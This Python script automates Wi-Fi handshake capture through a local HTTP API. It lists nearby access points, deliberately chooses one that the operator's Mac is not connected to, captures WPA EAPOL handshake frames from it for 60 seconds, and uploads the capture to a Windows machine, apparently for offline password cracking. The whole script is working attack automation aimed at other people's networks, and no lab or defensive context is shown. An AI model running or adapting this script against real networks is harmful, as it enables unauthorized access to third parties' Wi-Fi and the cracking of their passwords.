"""Pick a network Mac hasn't connected to and capture EAPOL."""
import requests, time

HOST = "192.168.1.102"

# Get AP list
r = requests.get(f"http://{HOST}:8765/api/state", timeout=10)
d = r.json()
ap_list = d['ap_list']

print(f"Found {len(ap_list)} networks:\n")
for i, ap in enumerate(ap_list):
    print(f"{i+1}. {ap['ssid']} ({ap['bssid']})")

# Pick a network that's NOT 32H9F_5G (the one Mac is connected to)
# Look for one with different BSSID
target = None
for ap in ap_list:
    if ap['bssid'] != '6c:4f:89:4c:a0:e4':  # Not the current network
        target = ap
        break

if not target:
    print("\nNo target found!")
    exit(1)

print(f"\nTarget: {target['ssid']} ({target['bssid']})")

# Start capture
print(f"\nStarting capture ({60}s)...")
r = requests.post(
    f"http://{HOST}:8765/api/capture",
    params={
        "bssid": target['bssid'],
        "ssid": target['ssid'],
        "duration": 60
    },
    timeout=10
)
print(f"Response: {r.json()}")

# Poll
print("\nPolling...")
for i in range(13):  # 65s / 5s
    time.sleep(5)
    r = requests.get(f"http://{HOST}:8765/api/state", timeout=10)
    d = r.json()
    print(f"  [{(i+1)*5}s] {d['status']} - {d['message']}")
    if d['status'] == 'idle' and d.get('capture_file'):
        break

# Check result
print(f"\nCapture file: {d.get('capture_file')}")
print(f"EAPOL count: {d.get('capture_eapol_count', 0)}")
print(f"EAPOL target: {d.get('capture_eapol_target', 0)}")

# Upload
if d.get('capture_file') and d.get('capture_eapol_target', 0) > 0:
    print("\nUploading to Windows...")
    r = requests.post(f"http://{HOST}:8765/api/upload", timeout=10)
    print(f"Response: {r.json()}")
    
    # Poll upload
    for i in range(10):
        time.sleep(3)
        r = requests.get(f"http://{HOST}:8765/api/state", timeout=10)
        d = r.json()
        print(f"  [{(i+1)*3}s] {d['status']} - {d['message']}")
        if d['status'] == 'idle' and d.get('upload_status') == 'success':
            break
else:
    print("\nNo EAPOL captured. Try another network or manual toggle.")
